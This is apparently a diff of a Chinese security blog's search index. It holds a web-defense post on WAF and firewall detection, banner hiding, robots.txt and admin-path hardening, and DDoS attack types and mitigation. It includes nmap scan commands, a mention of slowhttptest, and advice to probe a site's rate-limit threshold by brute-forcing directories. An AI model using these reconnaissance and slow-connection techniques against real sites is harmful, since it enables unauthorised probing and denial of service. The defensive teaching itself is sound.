-<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
-<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
-<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
-<blockquote>
-<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
-</blockquote>
-<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
-<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
-<blockquote>
-<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
-</blockquote>
-<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
-<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
-<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
-<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
-<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
-<p>这种攻击主要有以下几种形式：</p>
-<blockquote>
-<p>（1）Slowloris攻击</p>
-<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
-<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
-<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
-<p>kali自带一个slowhttptest工具</p>
-</blockquote>
-<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
-<blockquote>
-<p>（2）Slow HTTP POST</p>
-<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
-<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
-</blockquote>
-<blockquote>
-<p>（3）Slow Read Attack</p>
-<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
-</blockquote>
-<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
-<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
-<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
-<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
-<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
-<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
-<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
-<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
-<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
-<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
-<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
-<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
-<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
-<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
-<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
-<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
-<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
-<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
-<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
-]]></content>
-      <categories>
-        <category>《WEB安全基础》</category>
-        <category>防护识别</category>
-      </categories>
-      <tags>
-        <tag>《WEB安全基础》</tag>
-        <tag>防护识别</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>用户视角下的信息探测</title>
     <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/</url>
     <content><![CDATA[<h1 id="1-whois信息"><a href="#1-whois信息" class="headerlink" title="1.whois信息"></a>1.whois信息</h1><p>首先，获得了域名。比如<a href="http://www.baidu.com./">www.baidu.com。</a></p>
@@ -14473,6 +14266,193 @@
       <tags>
         <tag>《WEB安全基础》</tag>
         <tag>信息探测</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web防护及识别</title>
+    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
+    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
+<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
+<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
+<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
+<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
+<blockquote>
+<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
+</blockquote>
+<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
+<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
+<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
+<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
+<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
+<blockquote>
+<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
+</blockquote>
+<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
+<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
+<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
+<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
+<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
+<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
+<blockquote>
+<p>·目标的端口号（确认攻击目标有哪些）。</p>
+<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
+<p>·目标是否有明显漏洞等信息。</p>
+</blockquote>
+<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
+<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
+<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
+<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
+<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
+<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
+<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
+<p><code>#nmap -sS 192.168.1.1</code></p>
+<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
+<p>如果配置文件不设置的话，就是默认配置。</p>
+<p>当然了，如果没发现目标端口</p>
+<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
+<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
+<blockquote>
+<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
+</blockquote>
+<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
+<blockquote>
+<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
+</blockquote>
+<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
+<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
+<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
+<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
+<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
+<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
+<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
+<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
+<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
+<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
+<p>攻击者获得目标服务器的banner信息方式为：</p>
+<blockquote>
+<p>1.利用NMAP进行扫描</p>
+<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
+</blockquote>
+<blockquote>
+<p>2.利用非正常页面查看banner信息</p>
+<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
+</blockquote>
+<blockquote>
+<p>3.抓取服务器response包一样会有服务器信息</p>
+<p>见bp抓的响应包中的server。</p>
+</blockquote>
+<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
+<p>几个中间件的banner修改方案如下：</p>
+<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
+<p>关闭版本号显示的方法如下：</p>
+<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
+<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
+<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
+</blockquote>
+<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
+<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
+<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
+<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
+<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
+<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
+</blockquote>
+<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
+<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
+</blockquote>
+<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
+<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
+<blockquote>
+<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
+</blockquote>
+<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
+<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
+<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
+<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
+<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>
+
+<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
+<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
+<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
+<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
+<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
+<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
+<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
+<blockquote>
+<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
+<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
+</blockquote>
+<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
+<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
